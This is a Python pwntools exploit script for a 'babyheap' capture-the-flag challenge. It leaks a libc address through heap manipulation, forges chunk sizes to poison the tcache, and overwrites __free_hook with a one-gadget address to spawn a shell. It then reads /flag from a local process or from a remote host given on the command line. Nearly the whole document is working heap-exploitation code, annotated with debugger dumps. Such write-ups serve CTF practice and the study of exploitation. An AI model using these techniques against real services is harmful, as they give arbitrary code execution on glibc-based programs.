#!/usr/bin/env python2
from pwn import *

# EOL = '>' Command:\n> 
EOL = 'Command:\n> ' 
def malloc(size, content=None):
    # info('malloc ' + content)
    r.sendlineafter(EOL, 'M')
    r.sendlineafter('Size:\n> ', str(size))
    r.sendlineafter('Content:\n> ', content or 'AAAA')

def free(index):
    r.sendlineafter(EOL, 'F')
    r.sendlineafter('Index:\n> ', str(index))

def show(index):
    r.sendlineafter(EOL, 'S')
    r.sendlineafter('Index:\n> ', str(index))
    string = r.recvline()[:-1]
    return string

def libc_leak():
    for i in xrange(10):
        malloc(0x10, str(i) * 5)
    
    for i in xrange(6):
        free(i)
    free(9) # now the tcache bins are filled up

    free(6) # now 6 is in unsorted bin and has valid fd and bk
    free(7) # now 7 is in unsorted bin and has valid fd and bk
    free(8) # now 8 is in unsorted bin and has valid fd and bk

    # Now all chunks are freed
    # 2. put 6, 7, 8 back to malloced so that it can be freed again
    # To malloc 6, 7, 8 we have to consume the tcache first. The overwrite operation needs to happen in the end, otherwise mallocing operation will override the overwrite operation.
    for i in xrange(7):
        malloc(0xf8, str(i) * 0x20)
    malloc(0x50, '7' * 0x40)
    malloc(0x20, '8')

    string = show(8)
    info(string)
    
    for i in xrange(9):
        free(i)
    return u64(string.strip().ljust(8, '\x00'))


def writeto(where, gadgets):
    info('writing to 0x%x with [%s]' % (where, ",".join(map(hex, gadgets))))

    # 1. fill up tcache, and make sure it is a -> a+0x100

    # TODO: what if we overwrite the size to 0x81 directly??
    for i in xrange(3):
        # 2. allocate the first tcache chunk with overriding size
        malloc(0xf8, 'A' * 0xf8 + p8(0xa1))

        # 3. allocate the second chunk
        malloc(0xf8)

        # 4. free the second chunk, which index is 1
        free(1+i)

    """
    pwndbg> bins
    tcachebins
    0x100 [  1]: 0x556618cdeb60 <- 0x0
    0x1a0 [  3]: 0x556618cde760 -> 0x556618cde560 -> 0x556618cde360 <- 0x0
    unsortedbin
    all: 0x556618cde850 -> 0x7f0a5f90aca0 (main_arena+96) <- 0x556618cde850
    pwndbg> top_chunk
    0x556618cdec50
    """

    # now we should have 0, 1, 2
    malloc(0x40, '3' * 0x20)   # 3, tcache, 0x5598b2195d50
    malloc(0x40, '4' * 0x20)   # 4, unsorted bin, 0x5598b2195a50
    malloc(0x40, '5' * 0x20)   # 4, unsorted bin, 0x5598b2195b50
    malloc(0x40, '6' * 0x20)   # 4, unsorted bin, 0x5598b2195c50
    free(3)
    free(6) # 0x5598b2195c50 -> 0x5598b2195d50
    malloc(0xf8, '3' * 0xf8 + p8(0xa1))
    malloc(0x40, '6' * 0x20)
    free(6)

    # now we should have 0, 1, 2, 3
    free(5)
    free(4) # 0x5598b2195a50 -> 0x5598b2195b50
    malloc(0xf8, '4' * 0xf8 + p8(0xa1))
    malloc(0x40, '5' * 0x20)
    free(5)


    # now we should have 0, 1, 2, 3, 4, and everything is clean but 0x1f0 in tcachebins
   
    for i in [5, 6]:
        malloc(0x40, str(i) * 0x20) # i
        malloc(0x40) # i+1

        free(i+1)
        free(i) # i -> i+1
        malloc(0xf8, str(i) * 0xf8 + p8(0xa1))
        malloc(0x40)
        free(i+1)
        
    # now we should have 0, 1, 2, 3, ... 6 and filled up 0x1f0 tcache bins

    # now we need one more time, and it should be put in unsorted bin
    i = 7
    malloc(0x40, str(i) * 0x20) # i
    malloc(0x40) # i+1

    free(i+1)
    free(i) # i -> i+1
    malloc(0xf8, str(i) * 0xf8 + p8(0xa1)) # 7, change the size of 8 to 0x1a1 
    malloc(0x40, str(8) * 0x40) # 8, 0x556618cdf150
    """
    pwndbg> bins
    tcachebins
    0x1a0 [  7]: 0x556618cdef60 -> 0x556618cded60 -> 0x556618cde960 -> 0x556618cdeb60 -> 0x556618cde760 <- ...
    """

    # we need to set up a chunk after 8 in order for prev_inuse tag.
    # we didn't pave the chunk after the chunk after 8, and when 8 is freed, the chunk after 8 will be unlinked.
    # for unlinking, we need to make the size of the chunk after 8 reasonable to guarantee
    # "chunksize (p) == prev_size (next_chunk (p))", where p is the chunk after 8.
    malloc(0xf8, str(9) * 0x98 + p8(0x61)) # 9, 0x556618cdf250
    # The key is to allocate 8, 9, two adjacent chunks and resize of both chunks.
    free(8) # unsorted bin thinks the chunk of 8 is in size of 0x1a1
    """
    pwndbg> bins
    tcachebins
    0x1a0 [  7]: 0x556618cdef60 -> 0x556618cded60 -> 0x556618cde960 -> 0x556618cdeb60 -> 0x556618cde760 <- ...
    unsortedbin
    all: 0x556618cdf150 -> 0x7f0a5f90aca0 (main_arena+96) <- 0x556618cdf150
    pwndbg> x/2gx 0x556618cdf150
    0x556618cdf150:	0x3737373737373737	0x00000000000001a1
    """
    # now we have 0-7, 9
    # The order is necessary. Allocate out the chunk from unsorted bin first to bypass the check in unsorted bin, otherwise it will raise SIGABRT. If you comment this line and the next free(8) you will see the issue. 
    malloc(0x100, '8' * 0x40) 
    free(0) # we emptify 0 for later use
    free(9) # 9 -> 0
    """
    tcachebins
    0x100 [  2]: 0x556618cdf260 -> 0x556618cde260 <- 0x0
    0x1a0 [  7]: 0x556618cdef60 -> 0x556618cded60 -> 0x556618cde960 -> 0x556618cdeb60 -> 0x556618cde760 <- ...
    """

    free(8) # we have to free and malloc again because there is no writing value after malloc
    malloc(0x150, str(8) * 0x100 + p64(where).strip('\x00'))
    """
    tcachebins
    0x100 [  2]: 0x556618cdf260 -> 0x7f1d90ecd5a8 (__free_hook) <- 0x0
    0x1a0 [  7]: 0x556618cdef60 -> 0x556618cded60 -> 0x556618cde960 -> 0x556618cdeb60 -> 0x556618cde760 <- ...
    """
    malloc(0x40, '0' * 0x20)
   
    # write *what* to *where*
    what = ''.join(map(p64, gadgets))
    malloc(0x40, what.strip('\0'))

    free(7)

def interact():
    sleep(2)
    r.sendline('cat /flag && exit')
    result = r.recvall(timeout=1)
    # result = r.recvall(timeout=10)
    info('flag: %s' % result)
    return result

def exploit():
    leaked_address = libc_leak()
    info(hex(leaked_address))
    libc = ELF('./libc.so')
    libc.address = leaked_address - 0x1bfc38 - 0x25000
    info('libc address: %s' % hex(libc.address))

    # writeto(libc.symbols['__free_hook'], libc.address+0x4f322)
    writeto(libc.symbols['__free_hook'], [libc.address+0x106ef8]) 
    # writeto(libc.symbols['__free_hook'], [libc.address+0xe237f]) 
    # writeto(libc.symbols['__malloc_hook'], [libc.address+0x0010b31e, libc.address+0x0010b31e, libc.address+0xe237f])  # pop rcx
    # writeto(libc.symbols['__free_hook'], libc.address+0x106ef8)
    # r.interactive()
    return interact()


def init(v):
    # r = process(['libc2.%d/ld-2.%d.so' % (v, v), './babyheap'], env={'LD_PRELOAD': os.path.join(os.getcwd(), 'libc2.%d/libc-2.%d.so' % (v, v))})
    r = process(['../service/src/babyheap'])
    return r

if __name__ == "__main__":
    for _ in xrange(1):
        if len(sys.argv) > 2:
            host = sys.argv[1]
            port = int(sys.argv[2])
            r = remote(host, port)
        else:
            r = init(29) 
        try:
            result = exploit()
            flag = re.search('OOO{[^}]+}', result)
            if flag is not None:
                print("FLAG: %s" % flag.group(0))
                break
        except Exception:
            continue
